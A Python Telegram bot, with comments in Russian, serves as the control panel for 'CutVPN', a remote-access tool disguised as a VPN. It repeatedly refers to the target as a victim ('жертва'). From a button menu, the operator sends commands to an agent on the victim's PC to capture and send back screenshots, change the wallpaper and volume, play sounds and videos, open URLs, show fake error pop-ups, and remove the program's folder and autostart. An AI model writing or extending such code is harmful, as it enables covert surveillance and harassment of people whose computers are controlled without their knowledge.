"""
CutVPN Telegram Bot  —  полная версия
======================================
Переменные окружения:
  BOT_TOKEN              — токен @BotFather          (обязательно)
  CUTVPN_CHAT_ID         — ваш chat_id               (обязательно)
  CUTVPN_AGENT_SECRET    — совпадает с agent.json     (рекомендуется)
  CUTVPN_AGENT_URL       — default: http://127.0.0.1:8765

Установка зависимостей:
  pip install "python-telegram-bot[job-queue]>=21" requests
"""
from __future__ import annotations

import base64, io, logging, os, textwrap
import requests
from telegram import (
    Bot, InlineKeyboardButton as Btn, InlineKeyboardMarkup as Markup,
    Update,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler,
    ContextTypes, MessageHandler, filters,
)

# ── Config ────────────────────────────────────────────────────────────────────
TOKEN        = os.environ["BOT_TOKEN"]
CHAT_ID      = int(os.environ["CUTVPN_CHAT_ID"])
AGENT_URL    = os.environ.get("CUTVPN_AGENT_URL", "http://127.0.0.1:8765")
AGENT_SECRET = os.environ.get("CUTVPN_AGENT_SECRET", "")

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
                    level=logging.INFO)
log = logging.getLogger("cutvpn")

# ── Agent call ────────────────────────────────────────────────────────────────
def ag(command: str, **kw) -> dict:
    body = {"command": command}
    if AGENT_SECRET:
        body["secret"] = AGENT_SECRET
    body.update(kw)
    try:
        r = requests.post(f"{AGENT_URL}/command", json=body, timeout=20)
        return r.json()
    except requests.ConnectionError:
        return {"status":"error","message":"❌ Агент недоступен — запусти agent.py на машине жертвы"}
    except requests.Timeout:
        return {"status":"error","message":"❌ Таймаут 20 сек"}
    except Exception as e:
        return {"status":"error","message":f"❌ {e}"}

def ag_health() -> bool:
    try:
        return requests.get(f"{AGENT_URL}/health", timeout=4).ok
    except Exception:
        return False

# ── Auth ──────────────────────────────────────────────────────────────────────
def ok(u: Update) -> bool:
    return bool(u.effective_chat and u.effective_chat.id == CHAT_ID)

# ── Keyboards ─────────────────────────────────────────────────────────────────
def kb_main() -> Markup:
    return Markup([
        [Btn("📊 Статус",     callback_data="status"),
         Btn("ℹ️ Инфо",      callback_data="info"),
         Btn("📸 Скриншот",  callback_data="screenshot")],
        [Btn("🎭 Визуалы ВКЛ",  callback_data="visuals_on"),
         Btn("🛑 Визуалы ВЫКЛ", callback_data="visuals_off")],
        [Btn("🔊 MAX",   callback_data="vol_max"),
         Btn("🔇 Mute",  callback_data="vol_mute"),
         Btn("🔉 50%",   callback_data="vol_50"),
         Btn("🔈 25%",   callback_data="vol_25")],
        [Btn("💥 Ошибка ЧебурНета", callback_data="random_error"),
         Btn("💬 Сообщение",         callback_data="msgbox_start")],
        [Btn("🖼 Обои",  callback_data="wallpaper_ask"),
         Btn("🎵 Звук",  callback_data="sound_ask"),
         Btn("⏹ Стоп",  callback_data="sound_stop"),
         Btn("🎬 Видео", callback_data="video_ask")],
        [Btn("🌐 Открыть URL",      callback_data="url_ask"),
         Btn("📋 Лог агента",       callback_data="agent_log")],
        [Btn("🔄 Перезапуск CutVPN", callback_data="restart")],
        [Btn("🗑 УДАЛИТЬ CutVPN",    callback_data="uninstall_confirm")],
    ])

def kb_back() -> Markup:
    return Markup([[Btn("« Меню", callback_data="back_main")]])

def kb_yes_no(yes_cb: str) -> Markup:
    return Markup([[Btn("✅ Да", callback_data=yes_cb),
                    Btn("❌ Отмена", callback_data="back_main")]])

def kb_vol() -> Markup:
    return Markup([
        [Btn("🔊 MAX",  callback_data="vol_max"),
         Btn("🔉 75%",  callback_data="vol_75"),
         Btn("🔉 50%",  callback_data="vol_50"),
         Btn("🔈 25%",  callback_data="vol_25"),
         Btn("🔇 Mute", callback_data="vol_mute")],
        [Btn("« Меню", callback_data="back_main")],
    ])

# ── Format ────────────────────────────────────────────────────────────────────
EM = {
    "status":"📊","info":"ℹ️","screenshot":"📸",
    "visuals_on":"🎭","visuals_off":"🛑",
    "volume_max":"🔊","volume_mute":"🔇","volume_set":"🔉",
    "random_error":"💥","wallpaper_set":"🖼","sound_play":"🎵",
    "sound_stop":"⏹","video_play":"🎬","msgbox":"💬",
    "open_url":"🌐","restart":"🔄","uninstall":"🗑",
}

def fmt(cmd: str, res: dict) -> str:
    e   = EM.get(cmd,"✅")
    msg = res.get("message","")
    ok_ = res.get("status","ok") == "ok" and not res.get("error")
    # экранируем Markdown-символы в msg
    safe = msg.replace("_","\\_").replace("*","\\*").replace("`","\\`").replace("[","\\[")
    if ok_:
        return f"{e} *{cmd}*\n\n{safe}"
    return f"❌ *{cmd}*\n\n{safe}"

# ── Helpers ───────────────────────────────────────────────────────────────────
async def edit(q, text: str, kb=None, md=True):
    """Безопасный edit_text — если сообщение не изменилось, молча пропускает."""
    try:
        await q.message.edit_text(
            text,
            parse_mode=ParseMode.MARKDOWN if md else None,
            reply_markup=kb or kb_main(),
        )
    except Exception:
        pass

async def reply(update: Update, text: str, kb=None, md=True):
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.MARKDOWN if md else None,
        reply_markup=kb or kb_main(),
    )

# ── Handlers ──────────────────────────────────────────────────────────────────
async def cmd_start(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ok(u): return
    status = "🟢 агент онлайн" if ag_health() else "🔴 агент недоступен"
    await reply(u, f"*CutVPN Control* — {status}\n\nВыбери действие:", kb_main())


async def on_btn(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    if not q: return
    await q.answer()
    if not ok(u): return
    d = q.data or ""

    # ── Меню ──────────────────────────────────────────────────────────────────
    if d == "back_main":
        ctx.user_data.clear()
        await edit(q, "Главное меню:", kb_main())
        return

    # ── Прямые команды ────────────────────────────────────────────────────────
    if d in ("status","info","visuals_on","visuals_off","restart",
             "vol_max","vol_mute","random_error","sound_stop"):
        cmd_map = {"vol_max":"volume_max","vol_mute":"volume_mute",
                   "sound_stop":"sound_stop"}
        cmd = cmd_map.get(d, d)
        await edit(q, f"⏳ Выполняю *{cmd}*…")
        res = ag(cmd)
        await edit(q, fmt(cmd, res))
        return

    if d in ("vol_50","vol_75","vol_25"):
        lvl = {"vol_50":50,"vol_75":75,"vol_25":25}[d]
        await edit(q, f"⏳ Устанавливаю громкость {lvl}%…")
        res = ag("volume_set", level=lvl)
        await edit(q, fmt("volume_set", res))
        return

    # ── Скриншот ──────────────────────────────────────────────────────────────
    if d == "screenshot":
        await edit(q, "📸 Делаю скриншот…", kb_back())
        res = ag("screenshot")
        b64 = res.get("base64")
        if b64:
            try:
                await q.message.reply_photo(
                    photo=io.BytesIO(base64.b64decode(b64)),
                    caption=f"📸 `{res.get('message','screenshot')}`",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=kb_main(),
                )
                await q.message.delete()
                return
            except Exception as e:
                log.warning("photo send failed: %s", e)
        await edit(q, fmt("screenshot", res))
        return

    # ── Лог агента ────────────────────────────────────────────────────────────
    if d == "agent_log":
        await edit(q, "📋 Читаю лог…", kb_back())
        try:
            r = requests.get(f"{AGENT_URL}/log", timeout=5)
            txt = r.json().get("log","(пусто)")
        except Exception:
            txt = "(агент недоступен)"
        tail = txt[-3000:] if len(txt)>3000 else txt
        await edit(q, f"📋 *Лог агента*\n\n```\n{tail}\n```", kb_back())
        return

    # ── Промпты (ввод пути/текста) ────────────────────────────────────────────
    prompts = {
        "wallpaper_ask": ("wallpaper", "🖼 Введи путь к картинке на компе жертвы:\n\n`C:\\Users\\...\\photo.jpg`"),
        "sound_ask":     ("sound",     "🎵 Путь к WAV-файлу:\n\n`C:\\Windows\\Media\\tada.wav`\n_(пустой → стандартный Windows-звук)_"),
        "video_ask":     ("video",     "🎬 Путь к видеофайлу:\n\n`C:\\Users\\...\\video.mp4`"),
        "url_ask":       ("url",       "🌐 URL для открытия в браузере жертвы:\n\n`https://example.com`"),
        "msgbox_start":  ("msgbox_title", "💬 Введи *заголовок* окна:"),
    }
    if d in prompts:
        state, prompt = prompts[d]
        ctx.user_data["await"] = state
        await edit(q, prompt, kb_back())
        return

    # ── Uninstall ──────────────────────────────────────────────────────────────
    if d == "uninstall_confirm":
        await edit(q,
            "⚠️ *Удалить CutVPN с компьютера жертвы?*\n\n"
            "Удалит папку `%LOCALAPPDATA%\\CutVPN` и автозапуск.",
            kb_yes_no("uninstall_go"))
        return
    if d == "uninstall_go":
        await edit(q, "⏳ Удаляю…", kb_back())
        res = ag("uninstall")
        await edit(q, fmt("uninstall", res), Markup([[Btn("« Меню", callback_data="back_main")]]))
        return


async def on_text(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ok(u) or not u.message: return
    text  = (u.message.text or "").strip()
    state = ctx.user_data.get("await")

    if not state:
        await reply(u, "Главное меню:", kb_main())
        return

    # ── Wallpaper ─────────────────────────────────────────────────────────────
    if state == "wallpaper":
        ctx.user_data.clear()
        res = ag("wallpaper_set", path=text)
        await reply(u, fmt("wallpaper_set", res))

    # ── Sound ─────────────────────────────────────────────────────────────────
    elif state == "sound":
        ctx.user_data.clear()
        path = text if text else ""
        res  = ag("sound_play", path=path)
        await reply(u, fmt("sound_play", res))

    # ── Video ─────────────────────────────────────────────────────────────────
    elif state == "video":
        ctx.user_data.clear()
        res = ag("video_play", path=text)
        await reply(u, fmt("video_play", res))

    # ── URL ───────────────────────────────────────────────────────────────────
    elif state == "url":
        ctx.user_data.clear()
        res = ag("open_url", url=text)
        await reply(u, fmt("open_url", res))

    # ── Msgbox (2 шага) ───────────────────────────────────────────────────────
    elif state == "msgbox_title":
        ctx.user_data["await"]        = "msgbox_text"
        ctx.user_data["msgbox_title"] = text
        await reply(u,
            f"💬 Заголовок: *{text}*\n\nТеперь введи *текст* сообщения:",
            kb_back())

    elif state == "msgbox_text":
        title = ctx.user_data.get("msgbox_title","CutVPN")
        ctx.user_data.clear()
        res = ag("msgbox", title=title, text=text, icon="Warning")
        await reply(u, fmt("msgbox", res))


# ── Main ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu",  cmd_start))
    app.add_handler(CallbackQueryHandler(on_btn))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    log.info("CutVPN bot started | chat_id=%s | agent=%s", CHAT_ID, AGENT_URL)
    app.run_polling(drop_pending_updates=True, allowed_updates=["message","callback_query"])
